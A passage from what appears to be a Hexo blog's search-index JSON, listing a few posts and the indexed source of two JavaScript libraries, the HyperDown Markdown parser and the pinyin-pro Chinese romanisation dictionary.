建站"},{"title":"HTML5炫酷动画及源码DEMO演示","url":"/20191121/html5-xuan-ku-dong-hua-ji-yuan-ma-demo-yan-shi/","text":"HTML5动感的火焰燃烧动画特效DEMO演示 HTML5仿Apple Watch时钟动画DEMO演示 CSS3图片倾斜效果DEMO演示","tags":"html5"},{"title":"Hello World","url":"/20191116/hello-world/","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. ※Quick Start ※Create a new post 1$ hexo new &quot;My New Post&quot; More info: Writing ※Run server 1$ hexo server More info: Server ※Generate static files 1$ hexo generate More info: Generating ※Deploy to remote sites 1$ hexo deploy More info: Deployment","tags":"helloworld"},{"title":"创刊","url":"/19861001/chuang-kan/","text":"","tags":""},{"title":"","url":"/js/HyperDown.Parser.js","text":"// Generated by CoffeeScript 1.12.7 (function() { var Parser, slice = [].slice; Parser = (function() { var array_keys, array_values, htmlspecialchars, pL, preg_quote, str_replace, trim, ucfirst; ucfirst = function(str) { return (str.charAt(0)).toUpperCase() + str.substring(1); }; preg_quote = function(str) { return str.replace(/[-\\[\\]\\/\\{\\}\\(\\)\\*\\+\\?\\.\\\\\\^\\$\\|]/g, \"\\\\$&\"); }; pL = 'A-Za-z\\xAA\\xB5\\xBA\\xC0-\\xD6\\xD8-\\xF6\\xF8-\\u02C1\\u02C6-\\u02D1\\u02E0-\\u02E4\\u02EC\\u02EE\\u0370-\\u0374\\u0376\\u0377\\u037A-\\u037D\\u0386\\u0388-\\u038A\\u038C\\u038E-\\u03A1\\u03A3-\\u03F5\\u03F7-\\u0481\\u048A-\\u0527\\u0531-\\u0556\\u0559\\u0561-\\u0587\\u05D0-\\u05EA\\u05F0-\\u05F2\\u0620-\\u064A\\u066E\\u066F\\u0671-\\u06D3\\u06D5\\u06E5\\u06E6\\u06EE\\u06EF\\u06FA-\\u06FC\\u06FF\\u0710\\u0712-\\u072F\\u074D-\\u07A5\\u07B1\\u07CA-\\u07EA\\u07F4\\u07F5\\u07FA\\u0800-\\u0815\\u081A\\u0824\\u0828\\u0840-\\u0858\\u08A0\\u08A2-\\u08AC\\u0904-\\u0939\\u093D\\u0950\\u0958-\\u0961\\u0971-\\u0977\\u0979-\\u097F\\u0985-\\u098C\\u098F\\u0990\\u0993-\\u09A8\\u09AA-\\u09B0\\u09B2\\u09B6-\\u09B9\\u09BD\\u09CE\\u09DC\\u09DD\\u09DF-\\u09E1\\u09F0\\u09F1\\u0A05-\\u0A0A\\u0A0F\\u0A10\\u0A13-\\u0A28\\u0A2A-\\u0A30\\u0A32\\u0A33\\u0A35\\u0A36\\u0A38\\u0A39\\u0A59-\\u0A5C\\u0A5E\\u0A72-\\u0A74\\u0A85-\\u0A8D\\u0A8F-\\u0A91\\u0A93-\\u0AA8\\u0AAA-\\u0AB0\\u0AB2\\u0AB3\\u0AB5-\\u0AB9\\u0ABD\\u0AD0\\u0AE0\\u0AE1\\u0B05-\\u0B0C\\u0B0F\\u0B10\\u0B13-\\u0B28\\u0B2A-\\u0B30\\u0B32\\u0B33\\u0B35-\\u0B39\\u0B3D\\u0B5C\\u0B5D\\u0B5F-\\u0B61\\u0B71\\u0B83\\u0B85-\\u0B8A\\u0B8E-\\u0B90\\u0B92-\\u0B95\\u0B99\\u0B9A\\u0B9C\\u0B9E\\u0B9F\\u0BA3\\u0BA4\\u0BA8-\\u0BAA\\u0BAE-\\u0BB9\\u0BD0\\u0C05-\\u0C0C\\u0C0E-\\u0C10\\u0C12-\\u0C28\\u0C2A-\\u0C33\\u0C35-\\u0C39\\u0C3D\\u0C58\\u0C59\\u0C60\\u0C61\\u0C85-\\u0C8C\\u0C8E-\\u0C90\\u0C92-\\u0CA8\\u0CAA-\\u0CB3\\u0CB5-\\u0CB9\\u0CBD\\u0CDE\\u0CE0\\u0CE1\\u0CF1\\u0CF2\\u0D05-\\u0D0C\\u0D0E-\\u0D10\\u0D12-\\u0D3A\\u0D3D\\u0D4E\\u0D60\\u0D61\\u0D7A-\\u0D7F\\u0D85-\\u0D96\\u0D9A-\\u0DB1\\u0DB3-\\u0DBB\\u0DBD\\u0DC0-\\u0DC6\\u0E01-\\u0E30\\u0E32\\u0E33\\u0E40-\\u0E46\\u0E81\\u0E82\\u0E84\\u0E87\\u0E88\\u0E8A\\u0E8D\\u0E94-\\u0E97\\u0E99-\\u0E9F\\u0EA1-\\u0EA3\\u0EA5\\u0EA7\\u0EAA\\u0EAB\\u0EAD-\\u0EB0\\u0EB2\\u0EB3\\u0EBD\\u0EC0-\\u0EC4\\u0EC6\\u0EDC-\\u0EDF\\u0F00\\u0F40-\\u0F47\\u0F49-\\u0F6C\\u0F88-\\u0F8C\\u1000-\\u102A\\u103F\\u1050-\\u1055\\u105A-\\u105D\\u1061\\u1065\\u1066\\u106E-\\u1070\\u1075-\\u1081\\u108E\\u10A0-\\u10C5\\u10C7\\u10CD\\u10D0-\\u10FA\\u10FC-\\u1248\\u124A-\\u124D\\u1250-\\u1256\\u1258\\u125A-\\u125D\\u1260-\\u1288\\u128A-\\u128D\\u1290-\\u12B0\\u12B2-\\u12B5\\u12B8-\\u12BE\\u12C0\\u12C2-\\u12C5\\u12C8-\\u12D6\\u12D8-\\u1310\\u1312-\\u1315\\u1318-\\u135A\\u1380-\\u138F\\u13A0-\\u13F4\\u1401-\\u166C\\u166F-\\u167F\\u1681-\\u169A\\u16A0-\\u16EA\\u1700-\\u170C\\u170E-\\u1711\\u1720-\\u1731\\u1740-\\u1751\\u1760-\\u176C\\u176E-\\u1770\\u1780-\\u17B3\\u17D7\\u17DC\\u1820-\\u1877\\u1880-\\u18A8\\u18AA\\u18B0-\\u18F5\\u1900-\\u191C\\u1950-\\u196D\\u1970-\\u1974\\u1980-\\u19AB\\u19C1-\\u19C7\\u1A00-\\u1A16\\u1A20-\\u1A54\\u1AA7\\u1B05-\\u1B33\\u1B45-\\u1B4B\\u1B83-\\u1BA0\\u1BAE\\u1BAF\\u1BBA-\\u1BE5\\u1C00-\\u1C23\\u1C4D-\\u1C4F\\u1C5A-\\u1C7D\\u1CE9-\\u1CEC\\u1CEE-\\u1CF1\\u1CF5\\u1CF6\\u1D00-\\u1DBF\\u1E00-\\u1F15\\u1F18-\\u1F1D\\u1F20-\\u1F45\\u1F48-\\u1F4D\\u1F50-\\u1F57\\u1F59\\u1F5B\\u1F5D\\u1F5F-\\u1F7D\\u1F80-\\u1FB4\\u1FB6-\\u1FBC\\u1FBE\\u1FC2-\\u1FC4\\u1FC6-\\u1FCC\\u1FD0-\\u1FD3\\u1FD6-\\u1FDB\\u1FE0-\\u1FEC\\u1FF2-\\u1FF4\\u1FF6-\\u1FFC\\u2071\\u207F\\u2090-\\u209C\\u2102\\u2107\\u210A-\\u2113\\u2115\\u2119-\\u211D\\u2124\\u2126\\u2128\\u212A-\\u212D\\u212F-\\u2139\\u213C-\\u213F\\u2145-\\u2149\\u214E\\u2183\\u2184\\u2C00-\\u2C2E\\u2C30-\\u2C5E\\u2C60-\\u2CE4\\u2CEB-\\u2CEE\\u2CF2\\u2CF3\\u2D00-\\u2D25\\u2D27\\u2D2D\\u2D30-\\u2D67\\u2D6F\\u2D80-\\u2D96\\u2DA0-\\u2DA6\\u2DA8-\\u2DAE\\u2DB0-\\u2DB6\\u2DB8-\\u2DBE\\u2DC0-\\u2DC6\\u2DC8-\\u2DCE\\u2DD0-\\u2DD6\\u2DD8-\\u2DDE\\u2E2F\\u3005\\u3006\\u3031-\\u3035\\u303B\\u303C\\u3041-\\u3096\\u309D-\\u309F\\u30A1-\\u30FA\\u30FC-\\u30FF\\u3105-\\u312D\\u3131-\\u318E\\u31A0-\\u31BA\\u31F0-\\u31FF\\u3400-\\u4DB5\\u4E00-\\u9FCC\\uA000-\\uA48C\\uA4D0-\\uA4FD\\uA500-\\uA60C\\uA610-\\uA61F\\uA62A\\uA62B\\uA640-\\uA66E\\uA67F-\\uA697\\uA6A0-\\uA6E5\\uA717-\\uA71F\\uA722-\\uA788\\uA78B-\\uA78E\\uA790-\\uA793\\uA7A0-\\uA7AA\\uA7F8-\\uA801\\uA803-\\uA805\\uA807-\\uA80A\\uA80C-\\uA822\\uA840-\\uA873\\uA882-\\uA8B3\\uA8F2-\\uA8F7\\uA8FB\\uA90A-\\uA925\\uA930-\\uA946\\uA960-\\uA97C\\uA984-\\uA9B2\\uA9CF\\uAA00-\\uAA28\\uAA40-\\uAA42\\uAA44-\\uAA4B\\uAA60-\\uAA76\\uAA7A\\uAA80-\\uAAAF\\uAAB1\\uAAB5\\uAAB6\\uAAB9-\\uAABD\\uAAC0\\uAAC2\\uAADB-\\uAADD\\uAAE0-\\uAAEA\\uAAF2-\\uAAF4\\uAB01-\\uAB06\\uAB09-\\uAB0E\\uAB11-\\uAB16\\uAB20-\\uAB26\\uAB28-\\uAB2E\\uABC0-\\uABE2\\uAC00-\\uD7A3\\uD7B0-\\uD7C6\\uD7CB-\\uD7FB\\uF900-\\uFA6D\\uFA70-\\uFAD9\\uFB00-\\uFB06\\uFB13-\\uFB17\\uFB1D\\uFB1F-\\uFB28\\uFB2A-\\uFB36\\uFB38-\\uFB3C\\uFB3E\\uFB40\\uFB41\\uFB43\\uFB44\\uFB46-\\uFBB1\\uFBD3-\\uFD3D\\uFD50-\\uFD8F\\uFD92-\\uFDC7\\uFDF0-\\uFDFB\\uFE70-\\uFE74\\uFE76-\\uFEFC\\uFF21-\\uFF3A\\uFF41-\\uFF5A\\uFF66-\\uFFBE\\uFFC2-\\uFFC7\\uFFCA-\\uFFCF\\uFFD2-\\uFFD7\\uFFDA-\\uFFDC'; str_replace = function(search, replace, str) { var i, j, l, len, len1, val; if (search instanceof Array) { if (replace instanceof Array) { for (i = j = 0, len = search.length; j < len; i = ++j) { val = search[i]; str = str_replace(val, replace[i], str); } } else { for (l = 0, len1 = search.length; l < len1; l++) { val = search[l]; str = str_replace(val, replace, str); } } } else { search = preg_quote(search); str = str.replace(new RegExp(search, 'g'), replace.replace(/\\$/g, '$$$$')); } return str; }; htmlspecialchars = function(str) { return str.replace(/&/g, '&amp;').replace(//g, '&gt;').replace(/\"/g, '&quot;'); }; trim = function(str, ch) { var c, i, j, ref, search; if (ch == null) { ch = null; } if (ch != null) { search = ''; for (i = j = 0, ref = ch.length - 1; 0","tags":""},{"title":"","url":"/js/pinyin-pro.js","text":"!function(n,h){\"object\"==typeof exports&&\"undefined\"!=typeof module?h(exports):\"function\"==typeof define&&define.amd?define([\"exports\"],h):h((n=\"undefined\"!=typeof globalThis?globalThis:n||self).pinyinPro={})}(this,(function(n){\"use strict\";var h=[\"zh\",\"ch\",\"sh\",\"z\",\"c\",\"s\",\"b\",\"p\",\"m\",\"f\",\"d\",\"t\",\"n\",\"l\",\"g\",\"k\",\"h\",\"j\",\"q\",\"x\",\"r\",\"y\",\"w\",\"\"],g={\"南宫\":\"nán gōng\",\"第五\":\"dì wǔ\",\"万俟\":\"mò qí\",\"司马\":\"sī mǎ\",\"上官\":\"shàng guān\",\"欧阳\":\"ōu yáng\",\"夏侯\":\"xià hóu\",\"诸葛\":\"zhū gě\",\"闻人\":\"wén rén\",\"东方\":\"dōng fāng\",\"赫连\":\"hè lián\",\"皇甫\":\"huáng pǔ\",\"尉迟\":\"yù chí\",\"公羊\":\"gōng yáng\",\"澹台\":\"tán tái\",\"公冶\":\"gōng yě\",\"宗政\":\"zōng zhèng\",\"濮阳\":\"pú yáng\",\"淳于\":\"chún yú\",\"单于\":\"chán yú\",\"太叔\":\"tài shū\",\"申屠\":\"shēn tú\",\"公孙\":\"gōng sūn\",\"仲孙\":\"zhòng sūn\",\"轩辕\":\"xuān yuán\",\"令狐\":\"líng hú\",\"钟离\":\"zhōng lí\",\"宇文\":\"yǔ wén\",\"长孙\":\"zhǎng sūn\",\"慕容\":\"mù róng\",\"鲜于\":\"xiān yú\",\"闾丘\":\"lǘ qiū\",\"司徒\":\"sī tú\",\"司空\":\"sī kōng\",\"亓官\":\"qí guān\",\"司寇\":\"sī kòu\",\"仉督\":\"zhǎng dū\",\"子车\":\"zǐ jū\",\"颛孙\":\"zhuān sūn\",\"端木\":\"duān mù\",\"巫马\":\"wū mǎ\",\"公西\":\"gōng xī\",\"漆雕\":\"qī diāo\",\"乐正\":\"yuè zhèng\",\"壤驷\":\"rǎng sì\",\"公良\":\"gōng liáng\",\"拓跋\":\"tuò bá\",\"夹谷\":\"jiá gǔ\",\"宰父\":\"zǎi fǔ\",\"榖梁\":\"gǔ liáng\",\"段干\":\"duàn gān\",\"百里\":\"bǎi lǐ\",\"东郭\":\"dōng guō\",\"南门\":\"nán mén\",\"呼延\":\"hū yán\",\"羊舌\":\"yáng shé\",\"梁丘\":\"liáng qiū\",\"左丘\":\"zuǒ qiū\",\"东门\":\"dōng mén\",\"西门\":\"xī mén\",\"赵\":\"zhào\",\"钱\":\"qián\",\"孙\":\"sūn\",\"李\":\"lǐ\",\"周\":\"zhōu\",\"吴\":\"wú\",\"郑\":\"zhèng\",\"王\":\"wáng\",\"冯\":\"féng\",\"陈\":\"chén\",\"褚\":\"chǔ\",\"卫\":\"wèi\",\"蒋\":\"jiǎng\",\"沈\":\"shěn\",\"韩\":\"hán\",\"杨\":\"yáng\",\"朱\":\"zhū\",\"秦\":\"qín\",\"尤\":\"yóu\",\"许\":\"xǔ\",\"何\":\"hé\",\"吕\":\"lǚ\",\"施\":\"shī\",\"张\":\"zhāng\",\"孔\":\"kǒng\",\"曹\":\"cáo\",\"严\":\"yán\",\"华\":\"huà\",\"金\":\"jīn\",\"魏\":\"wèi\",\"陶\":\"táo\",\"姜\":\"jiāng\",\"戚\":\"qī\",\"谢\":\"xiè\",\"邹\":\"zōu\",\"喻\":\"yù\",\"柏\":\"bǎi\",\"水\":\"shuǐ\",\"窦\":\"dòu\",\"章\":\"zhāng\",\"云\":\"yún\",\"苏\":\"sū\",\"潘\":\"pān\",\"葛\":\"gě\",\"奚\":\"xī\",\"范\":\"fàn\",\"彭\":\"péng\",\"郎\":\"láng\",\"鲁\":\"lǔ\",\"韦\":\"wéi\",\"昌\":\"chāng\",\"马\":\"mǎ\",\"苗\":\"miáo\",\"凤\":\"fèng\",\"花\":\"huā\",\"方\":\"fāng\",\"俞\":\"yú\",\"任\":\"rèn\",\"袁\":\"yuán\",\"柳\":\"liǔ\",\"酆\":\"fēng\",\"鲍\":\"bào\",\"史\":\"shǐ\",\"唐\":\"táng\",\"费\":\"fèi\",\"廉\":\"lián\",\"岑\":\"cén\",\"薛\":\"xuē\",\"雷\":\"léi\",\"贺\":\"hè\",\"倪\":\"ní\",\"汤\":\"tāng\",\"滕\":\"téng\",\"殷\":\"yīn\",\"罗\":\"luó\",\"毕\":\"bì\",\"郝\":\"hǎo\",\"邬\":\"wū\",\"安\":\"ān\",\"常\":\"cháng\",\"乐\":\"yuè\",\"于\":\"yú\",\"时\":\"shí\",\"傅\":\"fù\",\"皮\":\"pí\",\"卞\":\"biàn\",\"齐\":\"qí\",\"康\":\"kāng\",\"伍\":\"wǔ\",\"余\":\"yú\",\"元\":\"yuán\",\"卜\":\"bǔ\",\"顾\":\"gù\",\"孟\":\"mèng\",\"平\":\"píng\",\"黄\":\"huáng\",\"和\":\"hé\",\"穆\":\"mù\",\"萧\":\"xiāo\",\"尹\":\"yǐn\",\"姚\":\"yáo\",\"邵\":\"shào\",\"湛\":\"zhàn\",\"汪\":\"wāng\",\"祁\":\"qí\",\"毛\":\"máo\",\"禹\":\"yǔ\",\"狄\":\"dí\",\"米\":\"mǐ\",\"贝\":\"bèi\",\"明\":\"míng\",\"臧\":\"zāng\",\"计\":\"jì\",\"伏\":\"fú\",\"成\":\"chéng\",\"戴\":\"dài\",\"谈\":\"tán\",\"宋\":\"sòng\",\"茅\":\"máo\",\"庞\":\"páng\",\"熊\":\"xióng\",\"纪\":\"jì\",\"舒\":\"shū\",\"屈\":\"qū\",\"项\":\"xiàng\",\"祝\":\"zhù\",\"董\":\"dǒng\",\"梁\":\"liáng\",\"杜\":\"dù\",\"阮\":\"ruǎn\",\"蓝\":\"lán\",\"闵\":\"mǐn\",\"席\":\"xí\",\"季\":\"jì\",\"麻\":\"má\",\"强\":\"qiáng\",\"贾\":\"jiǎ\",\"路\":\"lù\",\"娄\":\"lóu\",\"危\":\"wēi\",\"江\":\"jiāng\",\"童\":\"tóng\",\"颜\":\"yán\",\"郭\":\"guō\",\"梅\":\"méi\",\"盛\":\"shèng\",\"林\":\"lín\",\"刁\":\"diāo\",\"钟\":\"zhōng\",\"徐\":\"xú\",\"邱\":\"qiū\",\"骆\":\"luò\",\"高\":\"gāo\",\"夏\":\"xià\",\"蔡\":\"cài\",\"田\":\"tián\",\"樊\":\"fán\",\"胡\":\"hú\",\"凌\":\"líng\",\"霍\":\"huò\",\"虞\":\"yú\",\"万\":\"wàn\",\"支\":\"zhī\",\"柯\":\"kē\",\"昝\":\"zǎn\",\"管\":\"guǎn\",\"卢\":\"lú\",\"莫\":\"mò\",\"经\":\"jīng\",\"房\":\"fáng\",\"裘\":\"qiú\",\"缪\":\"miào\",\"干\":\"gān\",\"解\":\"xiè\",\"应\":\"yīng\",\"宗\":\"zōng\",\"丁\":\"dīng\",\"宣\":\"xuān\",\"贲\":\"bēn\",\"邓\":\"dèng\",\"郁\":\"yù\",\"单\":\"shàn\",\"杭\":\"háng\",\"洪\":\"hóng\",\"包\":\"bāo\",\"诸\":\"zhū\",\"左\":\"zuǒ\",\"石\":\"shí\",\"崔\":\"cuī\",\"吉\":\"jí\",\"钮\":\"niǔ\",\"龚\":\"gōng\",\"程\":\"chéng\",\"嵇\":\"jī\",\"邢\":\"xíng\",\"滑\":\"huá\",\"裴\":\"péi\",\"陆\":\"lù\",\"荣\":\"róng\",\"翁\":\"wēng\",\"荀\":\"xún\",\"羊\":\"yáng\",\"於\":\"yū\",\"惠\":\"huì\",\"甄\":\"zhēn\",\"曲\":\"qū\",\"家\":\"jiā\",\"封\":\"fēng\",\"芮\":\"ruì\",\"羿\":\"yì\",\"储\":\"chǔ\",\"靳\":\"jìn\",\"汲\":\"jí\",\"邴\":\"bǐng\",\"糜\":\"mí\",\"松\":\"sōng\",\"井\":\"jǐng\",\"段\":\"duàn\",\"富\":\"fù\",\"巫\":\"wū\",\"乌\":\"wū\",\"焦\":\"jiāo\",\"巴\":\"bā\",\"弓\":\"gōng\",\"牧\":\"mù\",\"隗\":\"kuí\",\"山\":\"shān\",\"谷\":\"gǔ\",\"车\":\"chē\",\"侯\":\"hóu\",\"宓\":\"mì\",\"蓬\":\"péng\",\"全\":\"quán\",\"郗\":\"xī\",\"班\":\"bān\",\"仰\":\"yǎng\",\"秋\":\"qiū\",\"仲\":\"zhòng\",\"伊\":\"yī\",\"宫\":\"gōng\",\"宁\":\"nìng\",\"仇\":\"qiú\",\"栾\":\"luán\",\"暴\":\"bào\",\"甘\":\"gān\",\"钭\":\"tǒu\",\"厉\":\"lì\",\"戎\":\"róng\",\"祖\":\"zǔ\",\"武\":\"wǔ\",\"符\":\"fú\",\"刘\":\"liú\",\"景\":\"jǐng\",\"詹\":\"zhān\",\"束\":\"shù\",\"龙\":\"lóng\",\"叶\":\"yè\",\"幸\":\"xìng\",\"司\":\"sī\",\"韶\":\"sháo\",\"郜\":\"gào\",\"黎\":\"lí\",\"蓟\":\"jì\",\"薄\":\"bó\",\"印\":\"yìn\",\"宿\":\"sù\",\"白\":\"bái\",\"怀\":\"huái\",\"蒲\":\"pú\",\"邰\":\"tái\",\"从\":\"cóng\",\"鄂\":\"è\",\"索\":\"suǒ\",\"咸\":\"xián\",\"籍\":\"jí\",\"赖\":\"lài\",\"卓\":\"zhuó\",\"蔺\":\"lìn\",\"屠\":\"tú\",\"蒙\":\"méng\",\"池\":\"chí\",\"乔\":\"qiáo\",\"阴\":\"yīn\",\"鬱\":\"yù\",\"胥\":\"xū\",\"能\":\"nài\",\"苍\":\"cāng\",\"双\":\"shuāng\",\"闻\":\"wén\",\"莘\":\"shēn\",\"党\":\"dǎng\",\"翟\":\"zhái\",\"谭\":\"tán\",\"贡\":\"gòng\",\"劳\":\"láo\",\"逄\":\"páng\",\"姬\":\"jī\",\"申\":\"shēn\",\"扶\":\"fú\",\"堵\":\"dǔ\",\"冉\":\"rǎn\",\"宰\":\"zǎi\",\"郦\":\"lì\",\"雍\":\"yōng\",\"郤\":\"xì\",\"璩\":\"qú\",\"桑\":\"sāng\",\"桂\":\"guì\",\"濮\":\"pú\",\"牛\":\"niú\",\"寿\":\"shòu\",\"通\":\"tōng\",\"边\":\"biān\",\"扈\":\"hù\",\"燕\":\"yān\",\"冀\":\"jì\",\"郏\":\"jiá\",\"浦\":\"pǔ\",\"尚\":\"shàng\",\"农\":\"nóng\",\"温\":\"wēn\",\"别\":\"bié\",\"庄\":\"zhuāng\",\"晏\":\"yàn\",\"柴\":\"chái\",\"瞿\":\"qú\",\"阎\":\"yán\",\"充\":\"chōng\",\"慕\":\"mù\",\"连\":\"lián\",\"茹\":\"rú\",\"习\":\"xí\",\"宦\":\"huàn\",\"艾\":\"ài\",\"鱼\":\"yú\",\"容\":\"róng\",\"向\":\"xiàng\",\"古\":\"gǔ\",\"易\":\"yì\",\"慎\":\"shèn\",\"戈\":\"gē\",\"廖\":\"liào\",\"庾\":\"yǔ\",\"终\":\"zhōng\",\"暨\":\"jì\",\"居\":\"jū\",\"衡\":\"héng\",\"步\":\"bù\",\"都\":\"dū\",\"耿\":\"gěng\",\"满\":\"mǎn\",\"弘\":\"hóng\",\"匡\":\"kuāng\",\"国\":\"guó\",\"文\":\"wén\",\"寇\":\"kòu\",\"广\":\"guǎng\",\"禄\":\"lù\",\"阙\":\"quē\",\"东\":\"dōng\",\"欧\":\"ōu\",\"殳\":\"shū\",\"沃\":\"wò\",\"利\":\"lì\",\"蔚\":\"wèi\",\"越\":\"yuè\",\"夔\":\"kuí\",\"隆\":\"lóng\",\"师\":\"shī\",\"巩\":\"gǒng\",\"厍\":\"shè\",\"聂\":\"niè\",\"晁\":\"cháo\",\"勾\":\"gōu\",\"敖\":\"áo\",\"融\":\"róng\",\"冷\":\"lěng\",\"訾\":\"zǐ\",\"辛\":\"xīn\",\"阚\":\"kàn\",\"那\":\"nā\",\"简\":\"jiǎn\",\"饶\":\"ráo\",\"空\":\"kōng\",\"曾\":\"zēng\",\"母\":\"mǔ\",\"沙\":\"shā\",\"乜\":\"niè\",\"养\":\"yǎng\",\"鞠\":\"jū\",\"须\":\"xū\",\"丰\":\"fēng\",\"巢\":\"cháo\",\"关\":\"guān\",\"蒯\":\"kuǎi\",\"相\":\"xiàng\",\"查\":\"zhā\",\"后\":\"hòu\",\"荆\":\"jīng\",\"红\":\"hóng\",\"游\":\"yóu\",\"竺\":\"zhú\",\"权\":\"quán\",\"逯\":\"lù\",\"盖\":\"gài\",\"益\":\"yì\",\"桓\":\"huán\",\"公\":\"gōng\",\"牟\":\"móu\",\"哈\":\"hǎ\",\"言\":\"yán\",\"福\":\"fú\"},i={\"líng\":[12295,20278,20940,21026,22265,22397,22796,22984,23112,23361,23738,24446,25493,26148,26382,26563,26818,27386,27422,27872,28137,28586,28789,29167,29223,29393,29618,29708,29940,30346,30769,31102,31202,31451,31533,32055,32190,32491,32656,32666,32718,32838,33330,33491,33777,34020,34054,34166,34505,34897,35052,35397,36297,36584,36632,37187,37309,37428,37634,38083,38301,38517,38646,38666,38679,38683,38685,38728,39382,39807,39914,40110,40210,40496,40567,40610,40801,40802,40836,40855],\"yī\":[19968,20042,20234,20381,21307,21530,21695,22123,22769,22777,22785,23259,23300,24332,25558,25742,27321,27593,27938,28175,28458,29823,30057,31054,31125,31270,32324,34524,34916,35689,36791,37116,37291,37541,38129,40406,40549,40671,40691],\"dīng zhēng\":[19969],\"kǎo qiǎo yú\":[19970],\"qī\":[19971,20507,20699,20932,22017,22660,23096,24765,24956,24957,25114,25471,26578,26724,26748,26866,27071,27450,27791,28114,28422,32042,32192,33803,35076,35526,36809,37098,37850,38667,39756,40328],\"shàng\":[19972,23577,23578,24678,32212,32497],\"xià\":[19973,19979,20068,22327,22799,22803,25047,26810,30108,30577,32581,37820,37868],\"hǎn\":[19974,21898,28011,32597,35907],\"wàn mò\":[19975],\"zhàng\":[19976,20183,22663,23938,24080,24115,24155,25177,26454,28081,30190,30252,30260,30613,31872,32960,33081,36076,36134,38556],\"sān\":[19977,21377,21441,24334,27637,27638,27647,29337,39702],\"shàng shǎng shang\":[19978],\"qí jī\":[19980,20854,22855],\"bù fǒu\":[19981],\"yǔ yù yú\":[19982],\"miǎn\":[19983,20589,20813,20885,21193,21204,21909,23081,24848,27717,27796,28238,30540,32236,32517,33148,33858,38758,39864],\"gài\":[19984,20066,21251,21252,25124,27010,27113,27114,28297,28433,29890,33890,37411,38041],\"chǒu\":[19985,19986,20404,21532,26493,30597,30657,37276,39767],\"zhuān\":[19987,21440,23269,23554,23560,29820,29966,30742,30935,30938,34788,35567,37151,38995,39067,40004],\"qiě jū\":[19988],\"pī\":[19989,20243,20286,22140,22383,23727,25013,25209,25259,28811,29385,29395,30738,30919,30996,30997,31195,31200,32794,35966,37043,37402,37471,37524,37635,37645,38713,39379,39660,39806],\"shì\":[19990,19991,20106,20107,20181,20365,20895,21183,21218,21323,21609,21980,22124,22763,22893,23317,23460,24066,24335,24337,24338,24640,24643,25146,25325,25555,26159,26160,26558,26623,26683,28584,28882,29046,30466,30478,30497,30551,31034,31035,31598,31789,33296,33299,35179,35222,35270,35298,35430,35475,35553,35610,35797,35877,36016,36147,36606,36732,36893,36990,37320,37322,37323,37424,37443,37501,38088,39166,39193,39197,39280,39960],\"qiū\":[19992,2e4,22389,23197,24664,24695,27e3,31179,31180,31312,31693,32231,33833,34322,34479,34677,34775,34852,36261,37041,38822,38823,39948,39949,40133,40342,40537,40861],\"bǐng\":[19993,23643,24626,25254,26142,26170,26564,26821,28851,31104,31177,31263,33514,34499,37044,37429,38467,38790,39173,39200,39292],\"yè\":[19994,20145,20727,22711,22812,23978,23979,25268,25433,25819,25834,25835,26196,26308,26309,26327,26355,26357,26556,26557,26989,27906,28082,28594,28904,29121,29207,29837,30371,30641,30648,30991,33099,33865,35585,35858,37050,37172,37745,37943,38757,38760,38913,39029,39203,39233,39308,39516,40314,40456],\"cóng\":[19995,20174,21474,23107,23406,24467,24468,24470,24752,27191,27401,28121,28743,29212,29742,34242,35508,36072,36073,37661],\"dōng\":[19996,20530,20908,21658,22508,23741,23852,24474,26168,26481,27681,27693,28087,31511,33523,33732,34624,39831,39903,40327,40363,40491,40725],\"sī\":[19997,20460,20952,21422,21496,21661,22070,22109,23204,24285,24662,25749,26031,26962,27840,28556,29133,31127,31136,31169,31993,32114,32230,32415,32524,32627,34156,34386,34547,34596,34692,34774,34804,37488,37551,37750,37889,38198,39096,39124,39462,40421,40502,40758],\"chéng\":[19998,21576,22478,22485,22552,22605,22614,23468,23800,24809,25074,25104,25215,25392,25473,25576,26536,26838,27225,27289,27910,28311,28546,29685,29689,30075,31243,31386,31596,32126,33069,33663,35488,35802,37077,37234,37614,38102,39468,39886],\"diū\":[19999,20002,37545,38117],\"liǎng\":[20001,20004,20841,21858,25498,32201,33084,34621,35058,39753,39758],\"yǒu\":[20003,21347,21451,26756,28277,29270,31113,32657,32840,33475,33696,34575,37193,37546,38101,40669],\"yán\":[20005,21427,21873,21926,22196,22633,22747,22759,22925,23032,23083,23086,23721,23890,23891,24012,24022,24023,24310,25541,26134,26956,27280,27369,27413,27839,28814,28815,29439,29698,30416,30878,31605,31799,33690,34053,34404,34578,35328,35329,35374,35453,35744,37076,38278,38331,38379,38414,38991,38996,39068,40573,40611],\"bìng\":[20006,20341,20482,20641,22442,25682,26660,30149,31369,31453,35457,38736,39849],\"sàng sāng\":[20007],\"gǔn\":[20008,24771,28378,28414,30937,32196,32498,34008,34057,34926,34974,36645,36746,39820,39872,40103],\"jiū\":[20009,21244,21886,25578,25579,26427,31350,31998,32416,33819,36211,38404,39695,39726,40169,40480],\"gè gě\":[20010,20491,21508],\"yā\":[20011,22311,23410,24216,25276,26514,26720,26895,37647,37914,40201,40232,40310,40486,40493],\"pán\":[20012,23227,24139,27075,27904,28682,29247,30424,30436,30928,32271,33968,34784,36434,36451,37788,38838],\"zhōng zhòng\":[20013],\"jǐ\":[20014,22912,24049,25119,25380,25486,25760,25824,27254,27890,29361,33034,34414,34787,39778,40062,40578],\"jiè\":[20015,20171,20511,21814,22586,23622,23626,23701,24206,24483,25106,26960,29335,29600,29758,30028,30029,30117,30734,34471,34550,34936,35119,35489,35819,37765,39601,39786],\"fēng\":[20016,20217,20561,20732,20968,20972,20974,22950,23543,23553,23791,23792,23862,26539,26963,27282,27811,27816,28194,28739,28925,29326,29478,29714,30127,30219,30461,30748,30904,31688,34356,34562,34861,35920,37175,37190,37586,37821,37856,38155,38715,38730,39116,40631],\"guàn kuàng\":[20017],\"chuàn\":[20018,27724,29588,36055,37351,38031],\"chǎn\":[20019,20135,20865,21111,22213,23932,26101,27984,28411,28763,29986,29987,31749,33927,34118,35522,35650,35719,35844,37855,38130,38323,38369,38416,39587],\"lín\":[20020,20903,22755,23818,23961,26036,26237,26301,26519,28542,28726,29136,29747,29848,30645,30852,30967,31910,31932,32343,32759,33256,36692,36762,36980,37051,37168,37883,38462,38563,38678,39502,40023,40158,40592,40607],\"zhuó\":[20021,21125,21331,21828,22324,22960,23098,25775,25798,25826,26027,26030,26033,26034,26037,26219,26899,27978,27998,28609,28796,28917,29752,30842,31130,31393,31831,31857,32620,33537,34839,34879,35521,35537,35638,35836,37196,37938,38255,40299,40415],\"zhǔ\":[20022,20027,21167,22065,22225,23444,24126,25284,28186,28624,29009,29038,29149,30633,30682,32604,35421,38524,40448,